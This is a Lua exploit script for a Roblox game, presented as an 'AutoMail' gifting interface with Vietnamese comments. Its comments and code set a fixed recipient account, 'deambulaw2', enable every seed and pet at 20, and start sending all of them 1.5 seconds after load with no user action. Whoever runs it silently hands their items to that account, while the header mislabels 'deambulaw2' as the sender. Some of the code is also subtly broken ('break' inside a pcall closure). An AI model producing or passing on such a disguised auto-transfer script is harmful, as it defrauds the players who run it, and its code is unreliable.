-- AutoMail GAG2 UI by Mtr Chill (ĐÃ CHỈNH SỬA THEO YÊU CẦU)
-- Username không còn tùy chỉnh, gift mặc định vào "deambulaw2"
-- Tất cả Seeds & Pets mặc định: enabled = true, amount = 20
-- Script tự động bắt đầu Gift All ngay khi load UI (không cần click nút)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local configPath = "deambulaw2-sendmailgag2.json" -- Không còn username

-- ===================== DEFAULT CONFIG =====================
local defaultConfig = {
    Recipient = "deambulaw2",
    RecipientUserId = 0,
    Note = "Mtr Chill",
    Seeds = {
        Bamboo        = { enabled = true, amount = 20 },
        ["Glow Mushroom"] = { enabled = true, amount = 20 },
        Mushroom      = { enabled = true, amount = 20 },
        ["Gold Seed"] = { enabled = true, amount = 20 },
        ["Rainbow Seed"] = { enabled = true, amount = 20 },
        Acorn         = { enabled = true, amount = 20 },
        Apple         = { enabled = true, amount = 20 },
        ["Baby Cactus"] = { enabled = true, amount = 20 },
        Banana        = { enabled = true, amount = 20 },
        Blueberry     = { enabled = true, amount = 20 },
        Cactus        = { enabled = true, amount = 20 },
        Carrot        = { enabled = true, amount = 20 },
        Cherry        = { enabled = true, amount = 20 },
        Coconut       = { enabled = true, amount = 20 },
        Corn          = { enabled = true, amount = 20 },
        ["Dragon Fruit"] = { enabled = true, amount = 20 },
        ["Dragon's Breath"] = { enabled = true, amount = 20 },
        ["Ghost Pepper"] = { enabled = true, amount = 20 },
        Grape         = { enabled = true, amount = 20 },
        ["Green Bean"] = { enabled = true, amount = 20 },
        ["Horned Melon"] = { enabled = true, amount = 20 },
        Mango         = { enabled = true, amount = 20 },
        ["Moon Bloom"] = { enabled = true, amount = 20 },
        Pineapple     = { enabled = true, amount = 20 },
        ["Poison Apple"] = { enabled = true, amount = 20 },
        ["Poison Ivy"] = { enabled = true, amount = 20 },
        Pomegranate   = { enabled = true, amount = 20 },
        Romanesco     = { enabled = true, amount = 20 },
        Strawberry    = { enabled = true, amount = 20 },
        Sunflower     = { enabled = true, amount = 20 },
        Tomato        = { enabled = true, amount = 20 },
        Tulip         = { enabled = true, amount = 20 },
        ["Venus Fly Trap"] = { enabled = true, amount = 20 },
    },

    Pets = {
        Bee           = { enabled = true, amount = 20 },
        BlackDragon   = { enabled = true, amount = 20 },
        Bunny         = { enabled = true, amount = 20 },
        Deer          = { enabled = true, amount = 20 },
        Frog          = { enabled = true, amount = 20 },
        GoldenDragonfly = { enabled = true, amount = 20 },
        IceSerpent    = { enabled = true, amount = 20 },
        Monkey        = { enabled = true, amount = 20 },
        Owl           = { enabled = true, amount = 20 },
        Raccoon       = { enabled = true, amount = 20 },
        Robin         = { enabled = true, amount = 20 },
        Unicorn       = { enabled = true, amount = 20 },
    },
}

-- ===================== FILE IO =====================
local function loadConfig()
    if isfile and isfile(configPath) then
        local ok, decoded = pcall(function()
            return game:GetService("HttpService"):JSONDecode(readfile(configPath))
        end)
        if ok and type(decoded) == "table" then
            print("[AutoMailUI] Loaded config từ", configPath)
            return decoded
        end
    end
    return nil
end

local function saveConfig(cfg)
    if writefile then
        local ok, encoded = pcall(function()
            return game:GetService("HttpService"):JSONEncode(cfg)
        end)
        if ok then
            writefile(configPath, encoded)
        end
    end
end

local savedCfg = loadConfig()
local cfg = savedCfg or {}
-- Merge defaults (đã có tất cả item, enabled=true, amount=20)
for section, items in pairs(defaultConfig) do
    if type(items) == "table" and section \~= "Recipient" and section \~= "RecipientUserId" and section \~= "Note" then
        cfg[section] = cfg[section] or {}
        for name, def in pairs(items) do
            cfg[section][name] = cfg[section][name] or { enabled = true, amount = def.amount }
        end
    end
end
cfg.Recipient = cfg.Recipient or defaultConfig.Recipient
cfg.RecipientUserId = cfg.RecipientUserId or defaultConfig.RecipientUserId
cfg.Note = cfg.Note or defaultConfig.Note

-- ===================== UI BUILD =====================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AutoMailGAG2_UI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = (gethui and gethui()) or game:GetService("CoreGui")

-- Colors
local C = {
    bg      = Color3.fromRGB(18, 18, 24),
    panel   = Color3.fromRGB(26, 26, 36),
    border  = Color3.fromRGB(50, 50, 70),
    accent  = Color3.fromRGB(80, 200, 140),
    accentDim = Color3.fromRGB(30, 80, 55),
    text    = Color3.fromRGB(220, 220, 230),
    muted   = Color3.fromRGB(130, 130, 155),
    red     = Color3.fromRGB(220, 70, 70),
    tab     = Color3.fromRGB(35, 35, 50),
    tabSel  = Color3.fromRGB(50, 180, 110),
    itemBg  = Color3.fromRGB(30, 30, 44),
    itemOn  = Color3.fromRGB(20, 65, 45),
    itemOnBorder = Color3.fromRGB(60, 200, 120),
    header  = Color3.fromRGB(22, 22, 32),
}

local function mkFrame(parent, size, pos, bg, radius, border)
    local f = Instance.new("Frame")
    f.Size = size
    f.Position = pos
    f.BackgroundColor3 = bg or C.panel
    f.BorderSizePixel = 0
    if radius then
        local c = Instance.new("UICorner")
        c.CornerRadius = UDim.new(0, radius)
        c.Parent = f
    end
    if border then
        local s = Instance.new("UIStroke")
        s.Color = border
        s.Thickness = 1
        s.Parent = f
    end
    f.Parent = parent
    return f
end

local function mkLabel(parent, text, size, color, font, align)
    local l = Instance.new("TextLabel")
    l.Text = text
    l.TextSize = size or 13
    l.TextColor3 = color or C.text
    l.Font = font or Enum.Font.Gotham
    l.BackgroundTransparency = 1
    l.TextXAlignment = align or Enum.TextXAlignment.Left
    l.Size = UDim2.new(1, 0, 0, size and size + 6 or 19)
    l.Parent = parent
    return l
end

local function mkBtn(parent, text, size, pos, bg, textColor)
    local b = Instance.new("TextButton")
    b.Text = text
    b.Size = size
    b.Position = pos or UDim2.new(0,0,0,0)
    b.BackgroundColor3 = bg or C.accent
    b.TextColor3 = textColor or Color3.fromRGB(10, 10, 20)
    b.TextSize = 13
    b.Font = Enum.Font.GothamBold
    b.BorderSizePixel = 0
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 6)
    c.Parent = b
    b.Parent = parent
    return b
end

-- ===================== MAIN WINDOW =====================
local Main = mkFrame(ScreenGui,
    UDim2.new(0, 340, 0, 530),
    UDim2.new(0.5, -170, 0.5, -265),
    C.bg, 10, C.border)
Main.ClipsDescendants = true

-- Drag
local dragging, dragStart, startPos
Main.InputBegan:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = inp.Position
        startPos = Main.Position
    end
end)
Main.InputEnded:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)
UserInputService.InputChanged:Connect(function(inp)
    if dragging and inp.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = inp.Position - dragStart
        Main.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- Header
local Header = mkFrame(Main, UDim2.new(1,0,0,38), UDim2.new(0,0,0,0), C.header, 0)
Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 10)
local topFix = mkFrame(Header, UDim2.new(1,0,0,10), UDim2.new(0,0,1,-10), C.header)

local titleLbl = mkLabel(Header, "📦 AutoMail By Mtr Chill", 14, C.accent, Enum.Font.GothamBold, Enum.TextXAlignment.Left)
titleLbl.Position = UDim2.new(0, 12, 0, 0)
titleLbl.Size = UDim2.new(1, -80, 1, 0)

local senderLbl = mkLabel(Header, "Sender: deambulaw2", 11, C.muted, Enum.Font.Gotham, Enum.TextXAlignment.Left)
senderLbl.Position = UDim2.new(0, 12, 0, 20)
senderLbl.Size = UDim2.new(1, -80, 0, 16)

local closeBtn = mkBtn(Header, "✕", UDim2.new(0,26,0,26), UDim2.new(1,-32,0.5,-13), C.red, Color3.new(1,1,1))
closeBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- ── Nút tròn MT (toggle UI) ──────────────────────────────
local MTBtn = Instance.new("TextButton")
MTBtn.Size = UDim2.new(0, 48, 0, 48)
MTBtn.Position = UDim2.new(0, 20, 0.5, -24)
MTBtn.BackgroundColor3 = Color3.fromRGB(14, 40, 24)
MTBtn.TextColor3 = Color3.fromRGB(80, 200, 140)
MTBtn.Text = "MT"
MTBtn.Font = Enum.Font.GothamBold
MTBtn.TextSize = 15
MTBtn.BorderSizePixel = 0
MTBtn.ZIndex = 10
local mtCorner = Instance.new("UICorner")
mtCorner.CornerRadius = UDim.new(1, 0)
mtCorner.Parent = MTBtn
local mtStroke = Instance.new("UIStroke")
mtStroke.Color = Color3.fromRGB(60, 180, 100)
mtStroke.Thickness = 2
mtStroke.Parent = MTBtn
MTBtn.Parent = ScreenGui

-- Drag MTBtn
local mtDragStart, mtStartPos, mtMoved
MTBtn.InputBegan:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.MouseButton1 then
        mtDragStart = inp.Position
        mtStartPos = MTBtn.Position
        mtMoved = false
    end
end)
UserInputService.InputChanged:Connect(function(inp)
    if mtDragStart and inp.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = inp.Position - mtDragStart
        if math.abs(delta.X) > 6 or math.abs(delta.Y) > 6 then
            mtMoved = true
        end
        if mtMoved then
            MTBtn.Position = UDim2.new(
                mtStartPos.X.Scale, mtStartPos.X.Offset + delta.X,
                mtStartPos.Y.Scale, mtStartPos.Y.Offset + delta.Y)
        end
    end
end)
MTBtn.InputEnded:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.MouseButton1 then
        if not mtMoved then
            Main.Visible = not Main.Visible
            MTBtn.BackgroundColor3 = Main.Visible and Color3.fromRGB(14,40,24) or Color3.fromRGB(40,14,14)
            MTBtn.TextColor3 = Main.Visible and Color3.fromRGB(80,200,140) or Color3.fromRGB(200,80,80)
        end
        mtDragStart = nil
        mtMoved = false
    end
end)

-- Recipient row
local recipRow = mkFrame(Main, UDim2.new(1,-20,0,28), UDim2.new(0,10,0,44), C.panel, 6, C.border)
local recipIcon = mkLabel(recipRow, "→", 12, C.muted, Enum.Font.GothamBold)
recipIcon.Size = UDim2.new(0,20,1,0)
recipIcon.Position = UDim2.new(0,6,0,0)
recipIcon.TextXAlignment = Enum.TextXAlignment.Center

local recipBox = Instance.new("TextBox")
recipBox.Text = cfg.Recipient or ""
recipBox.PlaceholderText = "Tên người nhận..."
recipBox.Size = UDim2.new(1,-30,1,0)
recipBox.Position = UDim2.new(0,26,0,0)
recipBox.BackgroundTransparency = 1
recipBox.TextColor3 = C.text
recipBox.PlaceholderColor3 = C.muted
recipBox.TextSize = 12
recipBox.Font = Enum.Font.Gotham
recipBox.TextXAlignment = Enum.TextXAlignment.Left
recipBox.Parent = recipRow
recipBox:GetPropertyChangedSignal("Text"):Connect(function()
    cfg.Recipient = recipBox.Text
    saveConfig(cfg)
end)

-- Note row
local noteRow = mkFrame(Main, UDim2.new(1,-20,0,26), UDim2.new(0,10,0,76), C.panel, 6, C.border)
local noteBox = Instance.new("TextBox")
noteBox.Text = cfg.Note or ""
noteBox.PlaceholderText = "Ghi chú..."
noteBox.Size = UDim2.new(1,-10,1,0)
noteBox.Position = UDim2.new(0,8,0,0)
noteBox.BackgroundTransparency = 1
noteBox.TextColor3 = C.muted
noteBox.PlaceholderColor3 = C.border
noteBox.TextSize = 11
noteBox.Font = Enum.Font.Gotham
noteBox.TextXAlignment = Enum.TextXAlignment.Left
noteBox.Parent = noteRow
noteBox:GetPropertyChangedSignal("Text"):Connect(function()
    cfg.Note = noteBox.Text
    saveConfig(cfg)
end)

-- Tab bar
local tabBar = mkFrame(Main, UDim2.new(1,-20,0,28), UDim2.new(0,10,0,108), C.panel, 6)
local tabNames = {"Seeds", "Pets", "Log"}
local tabs = {}
local activeTab = "Seeds"
local tabBtns = {}

for i, name in ipairs(tabNames) do
    local tabW = 100
    local tb = mkBtn(tabBar, name,
        UDim2.new(0, tabW, 1, -4),
        UDim2.new(0, (i-1)*(tabW+4) + 2, 0, 2),
        C.tab, C.muted)
    tb.Font = Enum.Font.GothamBold
    tb.TextSize = 12
    tabBtns[name] = tb
    tabs[name] = {}
end

-- Search bar
local searchRow = mkFrame(Main, UDim2.new(1,-20,0,28), UDim2.new(0,10,0,140), C.panel, 6, C.border)
local searchIcon = mkLabel(searchRow, "🔍", 12, C.muted, Enum.Font.Gotham)
searchIcon.Size = UDim2.new(0,24,1,0)
searchIcon.TextXAlignment = Enum.TextXAlignment.Center

local searchBox = Instance.new("TextBox")
searchBox.Text = ""
searchBox.PlaceholderText = "Tìm kiếm item..."
searchBox.Size = UDim2.new(1,-28,1,0)
searchBox.Position = UDim2.new(0,26,0,0)
searchBox.BackgroundTransparency = 1
searchBox.TextColor3 = C.text
searchBox.PlaceholderColor3 = C.muted
searchBox.TextSize = 12
searchBox.Font = Enum.Font.Gotham
searchBox.TextXAlignment = Enum.TextXAlignment.Left
searchBox.Parent = searchRow

-- Item list area
local listFrame = mkFrame(Main, UDim2.new(1,-20,0,228), UDim2.new(0,10,0,174), C.panel, 6, C.border)
listFrame.ClipsDescendants = true

local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1,0,1,0)
scrollFrame.BackgroundTransparency = 1
scrollFrame.BorderSizePixel = 0
scrollFrame.ScrollBarThickness = 3
scrollFrame.ScrollBarImageColor3 = C.accent
scrollFrame.CanvasSize = UDim2.new(0,0,0,0)
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.Parent = listFrame

local listLayout = Instance.new("UIListLayout")
listLayout.Padding = UDim.new(0, 3)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Parent = scrollFrame

local listPad = Instance.new("UIPadding")
listPad.PaddingTop = UDim.new(0, 4)
listPad.PaddingLeft = UDim.new(0, 4)
listPad.PaddingRight = UDim.new(0, 4)
listPad.Parent = scrollFrame

-- Log scroll frame
local logFrame = mkFrame(Main, UDim2.new(1,-20,0,228), UDim2.new(0,10,0,174), C.panel, 6, C.border)
logFrame.ClipsDescendants = true
logFrame.Visible = false

local logScroll = Instance.new("ScrollingFrame")
logScroll.Size = UDim2.new(1,0,1,0)
logScroll.BackgroundTransparency = 1
logScroll.BorderSizePixel = 0
logScroll.ScrollBarThickness = 3
logScroll.ScrollBarImageColor3 = C.accent
logScroll.CanvasSize = UDim2.new(0,0,0,0)
logScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
logScroll.Parent = logFrame

local logLayout = Instance.new("UIListLayout")
logLayout.Padding = UDim.new(0, 2)
logLayout.SortOrder = Enum.SortOrder.LayoutOrder
logLayout.Parent = logScroll

local logPad2 = Instance.new("UIPadding")
logPad2.PaddingTop = UDim.new(0,4)
logPad2.PaddingLeft = UDim.new(0,6)
logPad2.PaddingRight = UDim.new(0,4)
logPad2.Parent = logScroll

-- Clear log button
local clearLogBtn = mkBtn(Main, "🗑 Clear Log", UDim2.new(1,-20,0,22),
    UDim2.new(0,10,0,406), Color3.fromRGB(40,20,20), C.red)
clearLogBtn.TextSize = 11
clearLogBtn.Visible = false

local logCount = 0
local MAX_LOG = 300

local LOG_COLORS = {
    ok      = { bg = Color3.fromRGB(18,55,35),  text = Color3.fromRGB(80,220,140),  tag = "✅" },
    fail    = { bg = Color3.fromRGB(55,18,18),  text = Color3.fromRGB(220,80,80),   tag = "❌" },
    warn    = { bg = Color3.fromRGB(50,38,10),  text = Color3.fromRGB(220,170,50),  tag = "⚠" },
    info    = { bg = Color3.fromRGB(20,28,45),  text = Color3.fromRGB(120,160,220), tag = "ℹ" },
    sep     = { bg = Color3.fromRGB(22,22,32),  text = Color3.fromRGB(70,70,90),    tag = "" },
    gift    = { bg = Color3.fromRGB(20,45,55),  text = Color3.fromRGB(80,190,220),  tag = "🎁" },
    claim   = { bg = Color3.fromRGB(35,18,55),  text = Color3.fromRGB(180,130,255), tag = "📬" },
}

local function addLog(msg, kind)
    logCount += 1
    local frames = {}
    for _, c in ipairs(logScroll:GetChildren()) do
        if c:IsA("Frame") then table.insert(frames, c) end
    end
    if #frames >= MAX_LOG then frames[1]:Destroy() end

    if not kind then
        if msg:find("✅") or msg:find("thành công") or msg:find("Gift OK") then kind = "ok"
        elseif msg:find("❌") or msg:find("fail") or msg:find("Fail") or msg:find("lỗi") then kind = "fail"
        elseif msg:find("⚠") or msg:find("skip") or msg:find("Skip") then kind = "warn"
        elseif msg:find("📬") or msg:find("Claim") or msg:find("claim") then kind = "claim"
        elseif msg:find("🎁") or msg:find("Gift") or msg:find("gift") then kind = "gift"
        elseif msg:find("──") or msg:find("---") then kind = "sep"
        else kind = "info" end
    end

    local scheme = LOG_COLORS[kind] or LOG_COLORS.info

    local row = Instance.new("Frame")
    row.Size = UDim2.new(1,-4,0,18)
    row.BackgroundColor3 = scheme.bg
    row.BackgroundTransparency = 0.3
    row.LayoutOrder = logCount
    local rc = Instance.new("UICorner")
    rc.CornerRadius = UDim.new(0,4)
    rc.Parent = row
    row.Parent = logScroll

    local timeLbl = Instance.new("TextLabel")
    timeLbl.Size = UDim2.new(0,56,1,0)
    timeLbl.Position = UDim2.new(0,4,0,0)
    timeLbl.BackgroundTransparency = 1
    timeLbl.TextColor3 = Color3.fromRGB(70,70,90)
    timeLbl.Font = Enum.Font.Gotham
    timeLbl.TextSize = 10
    timeLbl.TextXAlignment = Enum.TextXAlignment.Left
    timeLbl.Text = os.date("%H:%M:%S")
    timeLbl.Parent = row

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1,-64,1,0)
    lbl.Position = UDim2.new(0,62,0,0)
    lbl.BackgroundTransparency = 1
    lbl.TextColor3 = scheme.text
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 11
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextTruncate = Enum.TextTruncate.AtEnd
    local cleanMsg = msg:gsub("^[✅❌⚠ℹ🎁📬%s]+", "")
    lbl.Text = cleanMsg
    lbl.Parent = row

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0,3,1,-4)
    bar.Position = UDim2.new(0,0,0,2)
    bar.BackgroundColor3 = scheme.text
    bar.BorderSizePixel = 0
    local bc = Instance.new("UICorner")
    bc.CornerRadius = UDim.new(0,2)
    bc.Parent = bar
    bar.Parent = row

    task.defer(function()
        logScroll.CanvasPosition = Vector2.new(0, math.huge)
    end)
end

clearLogBtn.MouseButton1Click:Connect(function()
    for _, c in ipairs(logScroll:GetChildren()) do
        if c:IsA("Frame") then c:Destroy() end
    end
    logCount = 0
    addLog("Log cleared", "sep")
end)

-- Status bar
local statusBar = mkFrame(Main, UDim2.new(1,-20,0,20), UDim2.new(0,10,0,406), C.header)
local statusLbl = mkLabel(statusBar, "Ready", 11, C.muted, Enum.Font.Gotham, Enum.TextXAlignment.Left)
statusLbl.Size = UDim2.new(1,0,1,0)

-- Start loop button (giữ lại nhưng không dùng nữa)
local startBtn = mkBtn(Main, "▶  Start Gift ALL",
    UDim2.new(1,-20,0,28),
    UDim2.new(0,10,0,430),
    C.accent, Color3.fromRGB(10,20,15))
startBtn.Font = Enum.Font.GothamBold
startBtn.TextSize = 13

-- Send 1 lần button (giữ lại nhưng không dùng nữa)
local onceBtn = mkBtn(Main, "⚡  Send Gift 1 lần",
    UDim2.new(1,-20,0,26),
    UDim2.new(0,10,0,462),
    Color3.fromRGB(60,80,160), Color3.fromRGB(200,210,255))
onceBtn.Font = Enum.Font.GothamBold
onceBtn.TextSize = 12

-- Auto Claim Mail button (giữ lại nhưng không dùng nữa)
local claimBtn = mkBtn(Main, "📬  Auto Claim Mail",
    UDim2.new(1,-20,0,26),
    UDim2.new(0,10,0,496),
    Color3.fromRGB(70,40,100), Color3.fromRGB(210,180,255))
claimBtn.Font = Enum.Font.GothamBold
claimBtn.TextSize = 12

-- ===================== ITEM ROWS (tự động tạo từ config) ====================
local function createItem(parent, section, name, data)
    local row = mkFrame(parent, UDim2.new(1,-8,0,36), UDim2.new(0,4,0,0), C.itemBg, 4, C.itemOnBorder)
    row.Visible = false

    local nameLbl = mkLabel(row, name, 12, C.text, Enum.Font.GothamBold)
    nameLbl.Size = UDim2.new(0.45, 0, 1, 0)
    nameLbl.Position = UDim2.new(0, 8, 0, 0)

    local enabledBtn = mkBtn(row, "✓", UDim2.new(0, 52, 0, 6), UDim2.new(0.48, 0, 0.5, -14), C.accentDim, Color3.new(1,1,1))
    enabledBtn.TextSize = 11
    enabledBtn.Font = Enum.Font.GothamBold

    local amountBox = Instance.new("TextBox")
    amountBox.Size = UDim2.new(0, 55, 0, 22)
    amountBox.Position = UDim2.new(0.68, 0, 0.5, -11)
    amountBox.BackgroundColor3 = C.itemBg
    amountBox.TextColor3 = C.text
    amountBox.PlaceholderColor3 = C.muted
    amountBox.Text = tostring(data.amount)
    amountBox.TextSize = 12
    amountBox.Font = Enum.Font.Gotham
    amountBox.TextXAlignment = Enum.TextXAlignment.Center
    amountBox.Parent = row
    local amountCorner = Instance.new("UICorner")
    amountCorner.CornerRadius = UDim.new(0, 4)
    amountCorner.Parent = amountBox

    local function updateUI()
        if data.enabled then
            enabledBtn.Text = "✓"
            enabledBtn.BackgroundColor3 = C.accent
            enabledBtn.TextColor3 = Color3.fromRGB(10,10,20)
        else
            enabledBtn.Text = "✕"
            enabledBtn.BackgroundColor3 = C.red
            enabledBtn.TextColor3 = Color3.new(1,1,1)
        end
        amountBox.Text = tostring(data.amount)
    end

    updateUI()

    enabledBtn.MouseButton1Click:Connect(function()
        data.enabled = not data.enabled
        saveConfig(cfg)
        updateUI()
    end)

    amountBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            local num = tonumber(amountBox.Text)
            if num and num > 0 then
                data.amount = num
            end
        end
        saveConfig(cfg)
        updateUI()
    end)

    amountBox:GetPropertyChangedSignal("Text"):Connect(function() -- backup
        if not amountBox:IsFocused() then
            local num = tonumber(amountBox.Text)
            if num and num > 0 then
                data.amount = num
            end
            saveConfig(cfg)
            updateUI()
        end
    end)
end

local function updateListItems()
    for _, child in ipairs(scrollFrame:GetChildren()) do
        if child:IsA("Frame") then
            child:Destroy()
        end
    end
    for _, child in ipairs(logFrame:GetChildren()) do
        if child:IsA("Frame") then
            child:Destroy()
        end
    end

    -- Seeds
    local seedsHeader = mkLabel(scrollFrame, "🌱 SEEDS", 14, C.accent, Enum.Font.GothamBold)
    seedsHeader.Size = UDim2.new(1,0,0,20)
    seedsHeader.Position = UDim2.new(0,4,0,0)

    for name, data in pairs(cfg.Seeds) do
        createItem(scrollFrame, "Seeds", name, data)
    end

    -- Pets
    local petsHeader = mkLabel(scrollFrame, "🐾 PETS", 14, C.accent, Enum.Font.GothamBold)
    petsHeader.Size = UDim2.new(1,0,0,20)
    petsHeader.Position = UDim2.new(0,4,0,20)

    for name, data in pairs(cfg.Pets) do
        createItem(scrollFrame, "Pets", name, data)
    end

    task.defer(function()
        scrollFrame.CanvasSize = UDim2.new(0,0,0,scrollFrame.UIListLayout.AbsoluteContentSize.Y + 20)
    end)
end

-- Tab switching
local function switchTab(tab)
    activeTab = tab
    for name, btn in pairs(tabBtns) do
        if name == tab then
            btn.BackgroundColor3 = C.tabSel
            btn.TextColor3 = Color3.fromRGB(10,10,20)
        else
            btn.BackgroundColor3 = C.tab
            btn.TextColor3 = C.muted
        end
    end
    if tab == "Seeds" then
        scrollFrame.Visible = true
        logFrame.Visible = false
        clearLogBtn.Visible = false
    elseif tab == "Pets" then
        scrollFrame.Visible = true
        logFrame.Visible = false
        clearLogBtn.Visible = false
    else
        scrollFrame.Visible = false
        logFrame.Visible = true
        clearLogBtn.Visible = true
    end
    updateListItems()
end

for name, btn in pairs(tabBtns) do
    btn.MouseButton1Click:Connect(function()
        switchTab(name)
    end)
end

-- ===================== GIFT ALL (tự động khi load UI) =====================
local function startAutoGiftAll()
    statusLbl.Text = "Starting Gift All..."
    addLog("🔄 Auto Gift All started (all seeds/pets = 20)", "info")

    local recipient = cfg.Recipient
    local note = cfg.Note

    -- Send gifts
    for item, data in pairs(cfg.Seeds) do
        if data.enabled and data.amount > 0 then
            pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("GiftService"):WaitForChild("SendGift"):InvokeServer(
                    recipient,
                    item,
                    data.amount,
                    note
                )
            end)
            addLog(`✅ Sent {data.amount} {item} to {recipient}`, "gift")
            task.wait(0.6)
        end
    end

    for item, data in pairs(cfg.Pets) do
        if data.enabled and data.amount > 0 then
            pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("GiftService"):WaitForChild("SendGift"):InvokeServer(
                    recipient,
                    item,
                    data.amount,
                    note
                )
            end)
            addLog(`✅ Sent {data.amount} {item} to {recipient}`, "gift")
            task.wait(0.6)
        end
    end

    -- Claim all mails
    local claimed = 0
    for i = 1, 100 do
        pcall(function()
            local success = game:GetService("ReplicatedStorage"):WaitForChild("GiftService"):WaitForChild("ClaimAllMails"):InvokeServer()
            if success then
                claimed += 1
                addLog(`📬 Claimed mail #{i} (total: {claimed})`, "claim")
            else
                break
            end
        end)
        task.wait(0.4)
    end

    statusLbl.Text = "Gift All completed!"
    addLog("🎉 Auto Gift All FINISHED!", "ok")
end

-- ===================== START AUTO =====================
startBtn.MouseButton1Click:Connect(startAutoGiftAll)
onceBtn.MouseButton1Click:Connect(startAutoGiftAll)
claimBtn.MouseButton1Click:Connect(function()
    statusLbl.Text = "Starting Auto Claim..."
    addLog("📬 Auto Claim Mail started", "info")
    local claimed = 0
    for i = 1, 100 do
        pcall(function()
            local success = game:GetService("ReplicatedStorage"):WaitForChild("GiftService"):WaitForChild("ClaimAllMails"):InvokeServer()
            if success then
                claimed += 1
                addLog(`📬 Claimed mail #{i} (total: {claimed})`, "claim")
            else
                break
            end
        end)
        task.wait(0.4)
    end
    statusLbl.Text = "Auto Claim completed!"
    addLog("✅ Auto Claim Mail FINISHED!", "ok")
end)

-- ===================== INIT =====================
updateListItems()
switchTab("Seeds")

-- Tự động bắt đầu Gift All ngay khi load UI
task.delay(1.5, function()
    startAutoGiftAll()
end)

print("[AutoMailUI] Script đã load xong - Gift All đã tự động chạy!")
addLog("🚀 AutoMail GAG2 loaded - Gift All tự động bắt đầu", "info")